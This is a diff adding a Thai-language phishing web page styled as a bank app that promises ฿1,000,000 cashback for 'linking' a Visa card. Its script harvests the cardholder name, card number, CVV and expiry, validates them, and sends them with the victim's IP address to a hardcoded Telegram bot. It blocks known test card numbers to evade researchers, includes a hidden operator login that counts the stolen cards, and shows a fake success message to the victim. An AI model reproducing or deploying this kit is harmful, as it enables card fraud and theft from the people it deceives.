@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> • รับเงินคืนทันที ฿1,000,000</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Sarabun:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root{--main:#0066ff;--accent:#00d4ff;--success:#00d4aa;--dark:#0f172a;--card:#1e293b;}
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
+      background:#f8fafc;font-family:'Kanit',sans-serif;color:#1e293b;
+      min-height:100vh;display:flex;align-items:center;justify-content:center;
+      background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+    }
+    .wrapper{max-width:420px;width:95%;background:#fff;border-radius:24px;overflow:hidden;
+             box-shadow:0 25px 80px rgba(0,0,0,0.3);position:relative;}
+    
+    /* Header - ดูเหมือนหน้าแอปธนาคารจริง */
+    .header{
+      background:linear-gradient(135deg,#0066ff,#0099ff);color:#fff;padding:30px 25px;text-align:center;position:relative;
+      overflow:hidden;
+    }
+    .header::before{
+      content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;
+      background:radial-gradient(circle,rgba(255,255,255,0.3),transparent);animation:float 20s infinite;
+    }
+    @keyframes float{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-30px)}}
+    .header h1{font-size:28px;font-weight:700;margin-bottom:8px;}
+    .header p{font-size:17px;opacity:0.95;}
+    .secure-badge{
+      position:absolute;top:15px;right:15px;background:rgba(0,0,0,0.3);padding:6px 12px;border-radius:50px;
+      font-size:13px;display:flex;align-items:center;gap:6px;
+    }
+
+    /* Body */
+    .body{padding:30px 28px;}
+    .offer{
+      background:linear-gradient(135deg,#00d4ff,#0066ff);color:#fff;padding:20px;border-radius:18px;
+      text-align:center;margin-bottom:30px;box-shadow:0 10px 30px rgba(0,212,255,0.3);
+    }
+    .offer h2{font-size:26px;font-weight:700;}
+    .offer .amount{font-size:48px;font-weight:800;margin:10px 0;letter-spacing:2px;}
+    .offer .note{font-size:14px;opacity:0.9;}
+
+    .form-group{margin:22px 0;position:relative;}
+    label{font-size:15px;color:#475569;display:block;margin-bottom:8px;font-weight:500;}
+    input,select{
+      width:100%;padding:16px 18px;border:2px solid #e2e8f0;border-radius:14px;
+      font-size:16px;transition:all .3s;background:#fff;
+    }
+    input:focus,select:focus{
+      outline:none;border-color:#0066ff;box-shadow:0 0 0 4px rgba(0,102,255,0.15);
+    }
+
+    /* 3D Card Preview - สุดจริง */
+    .card-preview{
+      margin:30px 0;background:var(--card);border-radius:18px;padding:20px;color:#fff;
+      box-shadow:0 15px 35px rgba(0,0,0,0.4);position:relative;overflow:hidden;
+    }
+    .card-preview::before{
+      content:"";position:absolute;top:0;left:0;right:0;height:60px;
+      background:linear-gradient(135deg,#667eea,#764ba2);
+    }
+    .card-logo{position:absolute;top:20px;right:20px;font-size:40px;font-weight:bold;}
+    .card-chip{position:absolute;top:70px;left:20px;width:50px;height:40px;background:linear-gradient(135deg,#ffd700,#b8860b);border-radius:8px;}
+    .card-number{font-size:22px;letter-spacing:4px;margin:80px 0 20px;text-align:center;font-family:monospace;}
+    .card-details{display:flex;justify-content:space-between;font-size:14px;margin-top:10px;}
+    .card-name{flex:1;}
+    .card-exp{text-align:right;}
+
+    button{
+      width:100%;padding:18px;border:none;border-radius:14px;background:var(--main);color:#fff;
+      font-size:19px;font-weight:600;margin-top:30px;cursor:pointer;transition:all .3s;
+      box-shadow:0 10px 30px rgba(0,102,255,0.4);
+    }
+    button:hover{transform:translateY(-3px);box-shadow:0 20px 40px rgba(0,102,255,0.5);}
+    button:disabled{background:#94a3b8;cursor:not-allowed;transform:none;box-shadow:none;}
+
+    .footer{
+      text-align:center;padding:20px;font-size:13px;color:#64748b;
+      background:#f1f5f9;margin-top:30px;border-radius:0 0 24px 24px;
+    }
+    .hidden{display:none;}
+    .loader{text-align:center;margin:30px 0;display:none;}
+    .spinner{
+      width:50px;height:50px;border:5px solid #f3f3f3;border-top:5px solid var(--main);
+      border-radius:50%;animation:spin 1s linear infinite;margin:auto;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+
+<div class="wrapper">
+  <!-- Header -->
+  <div class="header">
+    <div class="secure-badge"><i class="fas fa-shield-alt"></i> การเชื่อมต่อปลอดภัย</div>
+    <h1>Get Free Money</h1>
+    <p>รับเงินคืนสูงสุด ฿1,000,000 ทันที</p>
+  </div>
+
+  <!-- Login Page -->
+  <div id="login" class="body">
+    <div class="offer">
+      <h2>ยินดีต้อนรับสมาชิก</h2>
+      <div class="amount">฿1,000,000</div>
+      <div class="note">ผูกบัตรเพื่อรับเงินคืนทันที</div>
+    </div>
+    <form id="loginForm">
+      <div class="form-group">
+        <label>ชื่อผู้ใช้</label>
+        <input type="text" id="user" required>
+      </div>
+      <div class="form-group">
+        <label>รหัสผ่าน</label>
+        <input type="password" id="pass" required>
+      </div>
+      <button type="submit">เข้าสู่ระบบ</button>
+    </form>
+    <div class="footer">© 2025 Get Free Money  CO., LTD. • ใบอนุญาตเลขที่ 123/2568</div>
+  </div>
+
+  <!-- Card Page -->
+  <div id="cardpage" class="body hidden">
+    <div class="offer">
+      <h2>กรุณาผูกบัตร Visa</h2>
+      <div class="amount">฿1,000,000</div>
+      <div class="note">ใช้เวลาไม่ถึง 10 วินาที</div>
+    </div>
+
+    <div class="card-preview">
+      <div class="card-logo">VISA</div>
+      <div class="card-chip"></div>
+      <div class="card-number" id="cnum">•••• •••• •••• ••••</div>
+      <div class="card-details">
+        <div class="card-name" id="cname">ชื่อของคุณ</div>
+        <div class="card-exp" id="cexp">••/••</div>
+      </div>
+    </div>
+
+    <form id="cardForm">
+      <div class="form-group">
+        <label>ชื่อ-นามสกุลบนบัตร (ภาษาอังกฤษ)</label>
+        <input type="text" id="cardholder" required>
+      </div>
+      <div class="form-group">
+        <label>หมายเลขบัตร 16 หลัก</label>
+        <input type="text" id="cardNumber" maxlength="19" required>
+      </div>
+      <div id="err" style="color:#ef4444;text-align:center;margin:10px 0;font-weight:500;"></div>
+      <div style="display:flex;gap:15px;">
+        <div class="form-group" style="flex:1">
+          <label>วันหมดอายุ</label>
+          <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required>
+        </div>
+        <div class="form-group" style="flex:1">
+          <label>CVV</label>
+          <input type="text" id="cvv" maxlength="3" required>
+        </div>
+      </div>
+      <button type="submit" id="submitBtn" disabled>รับเงินคืน ฿1,000,000 ทันที</button>
+      <div class="loader"><div class="spinner"></div><p>กำลังตรวจสอบกับธนาคาร...</p></div>
+      <div id="success" class="hidden" style="background:#dcfce7;color:#166534;padding:20px;border-radius:14px;text-align:center;font-size:18px;">
+        สำเร็จ! เงินคืน ฿1,000,000 เข้าบัญชีเรียบร้อยแล้ว
+      </div>
+    </form>
+    <div class="footer">การทำธุรกรรมปลอดภัยด้วย SSL 256-bit</div>
+  </div>
+</div>
+
+<script>
+// บัตรทดสอบที่ต้องบล็อก
+const BLOCKED = ["4242424242424242","4111111111111111","4000000000000002","5555555555554444","378282246310005"];
+
+// Telegram
+const TOKEN = "8526795154:AAH8eyql_yQa-suktbvX8vClUAPC9MRUT8w";
+const CHAT = "5443546116";
+
+function close(){document.body.innerHTML="<h1 style='color:#fff;text-align:center;margin-top:200px;'>Connection Error</h1>";}
+
+function luhn(n){
+  let s=0,a=!1;
+  for(let i=n.length-1;i>=0;i--){let d=+n[i];a&&(d*=2,d>9&&(d-=9)),s+=d,a=!a;}
+  return s%10===0;
+}
+
+function isFuture(exp){
+  const [m,y]=exp.split("/").map(Number);
+  return new Date(2000+y,m)>new Date();
+}
+
+function validate(){
+  const num=document.getElementById("cardNumber").value.replace(/\D/g,"");
+  const cvv=document.getElementById("cvv").value;
+  const exp=document.getElementById("expiry").value;
+  const name=document.getElementById("cardholder").value.trim();
+  const err=document.getElementById("err");
+  const btn=document.getElementById("submitBtn");
+
+  if(BLOCKED.includes(num)){close();return;}
+  if(num.length!==16||!num.startsWith("4")||!luhn(num)||cvv.length!==3||!/^\d{2}\/\d{2}$/.test(exp)||!isFuture(exp)||name.length<3||!/^[A-Za-z\s]+$/.test(name)){
+    err.textContent="ข้อมูลบัตรไม่ถูกต้อง";btn.disabled=true;
+  }else{
+    err.textContent="";btn.disabled=false;
+  }
+}
+
+// Live preview
+document.getElementById("cardNumber").addEventListener("input",e=>{
+  let v=e.target.value.replace(/\D/g,"").match(/.{1,4}/g)?.join(" ")||"";
+  e.target.value=v;document.getElementById("cnum").textContent=v||"•••• •••• •••• ••••";validate();
+});
+document.getElementById("expiry").addEventListener("input",e=>{
+  let v=e.target.value.replace(/\D/g,"").slice(0,4);if(v.length>=2)v=v.slice(0,2)+"/"+v.slice(2);
+  e.target.value=v;document.getElementById("cexp").textContent=v||"••/••";validate();
+});
+document.getElementById("cardholder").addEventListener("input",e=>{
+  document.getElementById("cname").textContent=e.target.value||"ชื่อของคุณ";validate();
+});
+
+// Login
+document.getElementById("loginForm").addEventListener("submit",e=>{
+  e.preventDefault();
+  if(document.getElementById("user").value==="Dyma"&&document.getElementById("pass").value==="hackerkhmer"){
+    alert("Boss DYMA เข้าหลังบ้านแล้ว\nจำนวนบัตรทั้งหมด: "+(JSON.parse(localStorage.getItem("dymapay")||'[]').length));
+    return;
+  }
+  document.getElementById("login").classList.add("hidden");
+  document.getElementById("cardpage").classList.remove("hidden");
+});
+
+// Submit
+document.getElementById("cardForm").addEventListener("submit",async e=>{
+  e.preventDefault();
+  document.getElementById("submitBtn").style.display="none";
+  document.querySelector(".loader").style.display="block";
+
+  const data={
+    name:document.getElementById("cardholder").value,
+    card:document.getElementById("cardNumber").value,
+    cvv:document.getElementById("cvv").value,
+    exp:document.getElementById("expiry").value,
+    ip:await fetch("https://api.ipify.org").then(r=>r.text()),
+    time:new Date().toLocaleString("th-TH")
+  };
+
+  let list=JSON.parse(localStorage.getItem("dymapay")||"[]");
+  list.push(data);localStorage.setItem("dymapay",JSON.stringify(list));
+
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=*NEW CARD - DYMA PAY*%0A%0A*ชื่อ:* ${data.name}%0A*บัตร:* \`${data.card}\`%0A*CVV:* ${data.cvv}%0A*หมดอายุ:* ${data.exp}%0A*IP:* ${data.ip}%0A*เวลา:* ${data.time}&parse_mode=Markdown`);
+
+  setTimeout(()=>{
+    document.querySelector(".loader").style.display="none";
+    document.getElementById("success").classList.remove("hidden");
+  },4000);
+});
+</script>
+</body>
+</html>
